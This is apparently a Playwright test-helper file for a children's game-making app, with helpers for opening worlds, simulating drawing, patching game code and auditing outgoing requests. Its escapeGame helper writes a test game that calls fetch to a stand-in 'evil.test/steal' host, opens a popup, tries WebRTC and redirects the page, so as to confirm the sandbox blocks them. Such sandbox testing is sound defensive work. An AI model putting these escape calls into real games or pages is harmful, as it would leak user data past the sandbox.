/**
 * What the journeys and the seam specs share: the app's test hook, opening a starter or a seed as the
 * student's own world, the visible game (`window.__ambleGame` in the player frame), the cast by role (so the
 * specs follow the starters' own keys), drawing like a hand on the First page and the Desk, the Footsteps
 * panel, and requests that left the app.
 */
import type { Frame, Locator, Page } from '@playwright/test';
import { expect, gotoRoute } from '../helpers/app';
import type { Egress } from '../helpers/egress';
import { ellipse, humanStroke, line, stroke, type PenPoint } from '../helpers/pen';

export interface CastMemberView {
  key: string;
  name: string;
  role: string;
  kind: string;
  rig: string;
  status: string;
}

export interface WorldView {
  id: string;
  title: string;
  code: Array<{ path: string; source: string }>;
  cast: Record<string, { art: string | null; madeBy: string | null }>;
  dials: Record<string, number>;
  twists: string[];
  steps: Array<{ id: string; text: string; kind: string; by: string }>;
  head: string;
  origin: Record<string, unknown>;
  gameStorage?: Record<string, string>;
}

/** The editor's test hook, loosely typed: these helpers only read and call it. */
export interface AmbleHook {
  services: {
    store: {
      worlds: { get(id: string): Promise<WorldView | null>; list(): Promise<Array<{ id: string }>> };
      art: { get(id: string): Promise<Record<string, unknown> | null> };
      blobs: { get(ref: string): Promise<Blob | null> };
      commit(c: Record<string, unknown>): Promise<void>;
    };
    starters: {
      list(): Array<{ id: string; title: string; heroKey: string }>;
      open(id: string, o: { withArt: boolean; hero?: string }): Promise<{ world: WorldView; art: unknown[]; blobs: Blob[] }>;
    };
    player: {
      player: { iframe: HTMLIFrameElement | null } | null;
      robot(init: unknown): Promise<{ raw: { errors: unknown[]; frames: number }; verdict: { pass: boolean; reasons: string[] } }>;
      pause(): void;
    };
    ai: { status(): string };
  };
  store: AmbleHook['services']['store'];
  getState(): {
    session: { world: WorldView | null; cast: CastMemberView[]; mode: string; ready: boolean; manifest: { art: Array<{ key: string }> } | null };
    prefs: Record<string, unknown>;
    ai: Record<string, unknown>;
    library: { characters: Array<{ id: string; name: string; rig: string }> };
    config: Record<string, unknown>;
  };
  setState(fn: (s: Record<string, unknown>) => void): void;
  navigate(r: Record<string, unknown>): void;
  route(): { name: string } & Record<string, unknown>;
}

export interface GameHook {
  state: string;
  createCount: number;
  errors: unknown[];
  swaps: number;
  game: unknown;
  find(key: string): { drawn?: boolean; x?: number; y?: number } | null;
  objects(): Array<{ id: number; key: string | null; x: number; y: number; w: number; h: number; drawn: boolean; label?: string }>;
  dial(name: string): number | undefined;
  twists(): string[];
}

type AppWindow = Window & { __amble: AmbleHook };
type GameWindow = Window & { __ambleGame: GameHook };

/** Runs a function against the app's hook in the page (it is serialised: no closures). */
export function amble<T>(page: Page, fn: (a: AmbleHook) => T | Promise<T>): Promise<T> {
  return page.evaluate(`(${fn.toString()})(window.__amble)`) as Promise<T>;
}

export function world(page: Page): Promise<WorldView | null> {
  return page.evaluate(() => (window as unknown as AppWindow).__amble.getState().session.world);
}

export function storedWorld(page: Page, id: string): Promise<WorldView | null> {
  return page.evaluate((w) => (window as unknown as AppWindow).__amble.store.worlds.get(w), id);
}

/** The open world's cast, as the Cast line shows it. */
export function cast(page: Page): Promise<CastMemberView[]> {
  return page.evaluate(() =>
    (window as unknown as AppWindow).__amble.getState().session.cast.map((m) => ({ key: m.key, name: m.name, role: m.role, kind: m.kind, rig: m.rig, status: m.status })),
  );
}

/** The key of the open world's first cast member with this role (the starters name their members their own way). */
export async function keyOfRole(page: Page, role: string): Promise<CastMemberView> {
  await expect.poll(async () => (await cast(page)).some((m) => m.role === role), { timeout: 20_000 }).toBe(true);
  return (await cast(page)).find((m) => m.role === role)!;
}

/** How many games have reached their first frame on this page (the player layer counts them). */
export async function firstFrames(page: Page): Promise<number> {
  const layer = page.getByTestId('player-layer');
  return (await layer.count()) ? Number((await layer.getAttribute('data-first-frame')) ?? 0) : 0;
}

/** Waits for the world screen and a game's first frame after the `after`th one; returns the world id. */
export async function worldReady(page: Page, after = 0): Promise<string> {
  await expect(page).toHaveURL(/#\/w\/[A-Za-z0-9_-]+$/);
  await expect(page.getByTestId('screen-world')).toBeVisible();
  await expect.poll(() => firstFrames(page), { timeout: 60_000 }).toBeGreaterThan(after);
  await expect(page.getByTestId('world-loading')).toHaveCount(0);
  return new URL(page.url()).hash.replace('#/w/', '');
}

/** Opens a starter as the student's own world from its route (the Trail's sign does the same). */
export async function openStarter(page: Page, id = 'moon-king'): Promise<string> {
  const before = await firstFrames(page);
  await gotoRoute(page, `#/starter/${id}`);
  return worldReady(page, before);
}

/** Opens a starter as a seed ("give my hero a world"): nothing drawn but the given hero. */
export async function openSeed(page: Page, id = 'moon-king', hero?: string): Promise<string> {
  const before = await firstFrames(page);
  const worldId = await page.evaluate(
    async ({ starter, heroArt }) => {
      const a = (window as unknown as AppWindow).__amble;
      const { world: w } = await a.services.starters.open(starter, { withArt: false, ...(heroArt ? { hero: heroArt } : {}) });
      await a.services.store.commit({ worlds: [w] });
      a.navigate({ name: 'world', id: w.id });
      return w.id;
    },
    { starter: id, heroArt: hero ?? null },
  );
  await expect(page).toHaveURL(new RegExp(`#/w/${worldId}$`));
  await worldReady(page, before);
  return worldId;
}

/** The visible game's frame, once its game is up. */
export async function gameFrame(page: Page): Promise<Frame> {
  const handle = await page.evaluateHandle(() => (window as unknown as AppWindow).__amble.services.player.player?.iframe ?? null);
  const frame = await handle.asElement()?.contentFrame();
  if (!frame) throw new Error('No game frame.');
  await frame.waitForFunction(() => !!(window as unknown as GameWindow).__ambleGame?.game, null, { timeout: 30_000 });
  return frame;
}

export function readGame<T>(frame: Frame, fn: (g: GameHook) => T): Promise<T> {
  return frame.evaluate(`(${fn.toString()})(window.__ambleGame)`) as Promise<T>;
}

/** Whether the game shows a member's drawing (its objects on screen report `drawn`). */
export function drawnIn(frame: Frame, key: string): Promise<boolean> {
  return frame.evaluate((k) => {
    const g = (window as unknown as GameWindow).__ambleGame;
    const on = g.objects().filter((o) => o.key === k);
    return on.length > 0 && on.every((o) => o.drawn);
  }, key);
}

/** Starts the game from its title card (Space on the page goes to the game). */
export async function startGame(page: Page, frame: Frame): Promise<void> {
  if ((await readGame(frame, (g) => g.state)) === 'running') return;
  await page.locator('body').focus();
  await page.keyboard.press('Space');
  await expect.poll(() => readGame(frame, (g) => g.state), { timeout: 20_000 }).toBe('running');
}

/** The robot test (6 s of game time, the automatic bot) on the open world, in the player's spare frame. */
export function robotTest(page: Page): Promise<{ pass: boolean; reasons: string[]; errors: unknown[]; frames: number }> {
  return page.evaluate(async () => {
    const a = (window as unknown as AppWindow).__amble;
    const w = a.getState().session.world;
    if (!w) throw new Error('No world is open.');
    const initUrl = '/src/world/init.ts';
    const prefsUrl = '/src/app/player/prefs.ts';
    const { toInitMessage } = (await import(/* @vite-ignore */ initUrl)) as { toInitMessage(w: unknown, o: unknown): Promise<unknown> };
    const { playerPrefsFrom } = (await import(/* @vite-ignore */ prefsUrl)) as { playerPrefsFrom(p: unknown): Record<string, unknown> };
    const init = await toInitMessage(w, { mode: 'robot', prefs: { ...playerPrefsFrom(a.getState().prefs), muted: true }, robot: { gameMs: 6000, seed: 1, bot: 'auto' }, autostart: true });
    const r = await a.services.player.robot(init);
    return { pass: r.verdict.pass, reasons: r.verdict.reasons, errors: r.raw.errors, frames: r.raw.frames };
  });
}

/** Taps the middle of a game object on the page (its box is in the game frame's CSS pixels, over the slot). */
export async function tapObject(page: Page, frame: Frame, key: string, slotId = 'world-slot'): Promise<void> {
  const find = () => frame.evaluate((k) => (window as unknown as GameWindow).__ambleGame.objects().find((o) => o.key === k) ?? null, key);
  await expect.poll(async () => (await find()) !== null, { timeout: 15_000 }).toBe(true);
  const box = (await find())!;
  const slot = (await page.getByTestId(slotId).boundingBox())!;
  await page.mouse.click(slot.x + box.x + box.w / 2, slot.y + box.y + box.h / 2);
}

// ------------------------------------------------------------------ drawing like a hand

/**
 * A little person with the big pen on the First page: head, body, arms out and legs apart (bold enough
 * that its bones are found every time).
 */
export async function drawPerson(page: Page, board: Locator): Promise<void> {
  // The First page's paper slides in: a stroke begun meanwhile lands it at once, shifted from the strokes
  // after it (a head drawn into the body). Draw once the paper has stopped moving.
  await expect(page.getByTestId('screen-first')).toHaveClass(/first--entered/, { timeout: 15_000 });
  const seen: string[] = [];
  await expect
    .poll(
      async () => {
        const b = await board.boundingBox();
        seen.push(b ? `${Math.round(b.x)},${Math.round(b.y)}` : '');
        const recent = seen.slice(-3);
        return recent.length === 3 && recent[0] !== '' && recent.every((at) => at === recent[0]);
      },
      { intervals: [250], timeout: 15_000 },
    )
    .toBe(true);
  await page.getByTestId('pen-size').click();
  await expect(page.getByTestId('pen-size')).toHaveAccessibleName(/big/i);
  const box = await board.boundingBox();
  if (!box) throw new Error('The paper is not on screen.');
  const cx = box.width * 0.45;
  const cy = box.height * 0.48;
  const strokes = [
    ellipse(cx, cy - 122, 40, 38, -90, 370),
    ellipse(cx, cy - 5, 56, 76, -90, 370),
    line(cx - 26, cy + 66, cx - 58, cy + 178, 3),
    line(cx + 26, cy + 66, cx + 58, cy + 178, -3),
    line(cx - 52, cy - 36, cx - 140, cy + 4, 5),
    line(cx + 52, cy - 36, cx + 140, cy + 4, -5),
  ];
  for (const [i, path] of strokes.entries()) await stroke(page, board, humanStroke(path, { seed: i + 1, speed: 900, p0: 0.5, p1: 0.9 }), { pointer: 'pen' });
}

interface DeskHook {
  getSnapshot(): { ready: boolean; mode: string; part: string | null; steps: Array<{ step: string }>; step: number };
  surface: { docToClient(x: number, y: number): { x: number; y: number } };
  board: { w: number; h: number };
}

/** Waits until the Desk's drawing takes input. */
export async function deskReady(page: Page): Promise<void> {
  await expect(page.getByTestId('screen-draw')).toBeVisible();
  await page.waitForFunction(() => {
    const d = (window as unknown as { __ambleDesk?: DeskHook | null }).__ambleDesk;
    return !!d && d.getSnapshot().ready;
  }, null, { timeout: 45_000 });
  await expect(page.locator('.desk__sheet canvas').first()).toBeVisible();
}

export function deskState(page: Page): Promise<{ mode: string; part: string | null; steps: string[]; step: number; board: { w: number; h: number } }> {
  return page.evaluate(() => {
    const d = (window as unknown as { __ambleDesk: DeskHook }).__ambleDesk;
    const s = d.getSnapshot();
    return { mode: s.mode, part: s.part, steps: s.steps.map((x) => x.step), step: s.step, board: { w: d.board.w, h: d.board.h } };
  });
}

/** Board px → CSS px relative to the Desk's sheet (what `stroke` takes). */
async function toSheet(page: Page, pts: Array<[number, number]>): Promise<Array<[number, number]>> {
  return page.evaluate((points) => {
    const d = (window as unknown as { __ambleDesk: DeskHook }).__ambleDesk;
    const el = document.querySelector('[data-testid="desk-board"]') as HTMLElement;
    const r = el.getBoundingClientRect();
    return points.map(([x, y]) => {
      const c = d.surface.docToClient(x, y);
      return [c.x - r.left, c.y - r.top] as [number, number];
    });
  }, pts);
}

export function circle(cx: number, cy: number, r: number, n = 48): Array<[number, number]> {
  return Array.from({ length: n + 1 }, (_, i) => {
    const a = (i / n) * Math.PI * 2;
    return [cx + Math.cos(a) * r, cy + Math.sin(a) * r * 0.9] as [number, number];
  });
}

/** A stroke through board-px points on the Desk. */
export async function drawOnBoard(page: Page, pts: Array<[number, number]>, pointer: 'pen' | 'mouse' | 'touch' = 'pen'): Promise<void> {
  const sheet: PenPoint[] = await toSheet(page, pts);
  await stroke(page, page.getByTestId('desk-board'), sheet, { pointer });
}

/** A tap at a board-px point on the Desk (the fill bucket's pour). */
export async function tapOnBoard(page: Page, x: number, y: number): Promise<void> {
  await drawOnBoard(page, [
    [x, y],
    [x + 0.2, y + 0.2],
  ]);
}

/** Lets the Desk's pen-up work settle (commits, the fill worker, the preview). */
export function settle(page: Page, ms = 400): Promise<void> {
  return page.waitForTimeout(ms);
}

/**
 * Draws a creature on the Desk: a body filled with colour and two eyes, then, on the bones, a line for
 * every step the drawing has (head, arms, legs, wings...), each chosen by tapping its chip.
 */
export async function drawOnDesk(page: Page): Promise<void> {
  const { w, h, steps } = await deskState(page).then((s) => ({ ...s.board, steps: s.steps }));
  const cx = w / 2;
  const cy = h * 0.55;
  await drawOnBoard(page, circle(cx, cy, Math.min(w, h) * 0.22));
  await settle(page);
  await page.getByTestId('desk-board').focus();
  await page.keyboard.press('g');
  await tapOnBoard(page, cx, cy);
  await settle(page, 600);
  await page.keyboard.press('b');
  await drawOnBoard(page, circle(cx - w * 0.07, cy - h * 0.06, Math.min(w, h) * 0.03, 16));
  await drawOnBoard(page, circle(cx + w * 0.07, cy - h * 0.06, Math.min(w, h) * 0.03, 16));
  await settle(page);
  const later = steps.slice(1).filter((s) => s !== 'extras');
  for (const [i, step] of later.entries()) {
    const chip = page.locator('.strip').getByRole('button', { name: new RegExp(`^${stepWord(step)}`, 'i') }).first();
    if (!(await chip.count())) continue;
    await chip.click();
    const y = cy - h * 0.3 + i * h * 0.18;
    await drawOnBoard(page, [
      [cx - w * 0.3, y],
      [cx - w * 0.1, y + h * 0.02],
      [cx + w * 0.1, y + h * 0.02],
      [cx + w * 0.3, y],
    ]);
    await settle(page);
  }
}

const STEP_WORDS: Record<string, string> = { body: 'Body', head: 'Head', arms: 'Arms', legs: 'Legs', wings: 'Wings', tail: 'Tail' };
function stepWord(step: string): string {
  return STEP_WORDS[step] ?? step;
}

// ------------------------------------------------------------------ AI changes

export const JUMP_SUMMARY = 'Now your hero can jump three times in the air.';

/** An AMBLE PATCH written against a world's own game.js: the hero's platformer gets a third jump. */
export function jumpPatch(gameSource: string, summary = JUMP_SUMMARY): string {
  const line = gameSource.split('\n').find((l) => l.includes('.platformer(') && l.includes('jumps: 2'));
  if (!line) throw new Error('No platformer line with jumps: 2 in this game.');
  return [
    '@@amble-patch 1',
    `@@summary ${summary}`,
    '@@play Press jump three times to fly higher.',
    '@@next Make the jumps higher|Add a dash in the air',
    '@@safety ok',
    '@@file game.js edit',
    '@@find',
    line,
    '@@replace',
    line.replace('jumps: 2', 'jumps: 3'),
    '@@done',
    '@@end',
    '',
  ].join('\n');
}

/** The open world's game.js. */
export async function gameSource(page: Page): Promise<string> {
  return (await world(page))?.code.find((f) => f.path === 'game.js')?.source ?? '';
}

/** A game that tries every way out: the network, WebRTC, a popup and leaving its page. */
export function escapeGame(to: string): string {
  return `// Tries every way out of the sandbox.
class Game extends Amble.Scene {
  static art = { hero: { kind: 'character', rig: 'biped', role: 'hero', name: 'Pip', w: 40, h: 64 } };
  create() {
    this.spawnHero(200, 300, 'hero');
    const tried = [];
    const note = () => localStorage.setItem('tried', tried.sort().join(','));
    try { tried.push(typeof RTCPeerConnection === 'function' && new RTCPeerConnection() ? 'rtc made' : 'rtc gone'); } catch (e) { tried.push('rtc blocked'); }
    try { tried.push(window.open('https://evil.test/popup') ? 'popup opened' : 'popup blocked'); } catch (e) { tried.push('popup blocked'); }
    try {
      fetch('https://evil.test/steal').then(() => { tried.push('fetch sent'); note(); }, () => { tried.push('fetch blocked'); note(); });
    } catch (e) { tried.push('fetch blocked'); note(); }
    localStorage.setItem('kept', 'yes');
    setTimeout(() => { location.href = '${to}'; }, 2500);
  }
}
`;
}

// ------------------------------------------------------------------ Footsteps and requests

/** The Footsteps panel's steps, newest first. */
export function footsteps(page: Page): Locator {
  return page.locator('.footsteps__trail > .step');
}

/** Requests that went anywhere but the app itself (data:, blob: and about: stay in the browser). */
export function outsideRequests(egress: Egress, appOrigin: string): string[] {
  return egress.requests
    .filter((r) => !/^(data|blob|about|chrome-extension|devtools):/i.test(r.url))
    .filter((r) => {
      try {
        return new URL(r.url).origin !== appOrigin;
      } catch {
        return true;
      }
    })
    .map((r) => `${r.method} ${r.url}`);
}

/** Requests the player's game frames made (games get everything from the editor, never the network). */
export function frameRequests(egress: Egress): string[] {
  return egress.requests.filter((r) => !r.mainFrame && !/^(data|blob|about):/i.test(r.url)).map((r) => `${r.method} ${r.url}`);
}
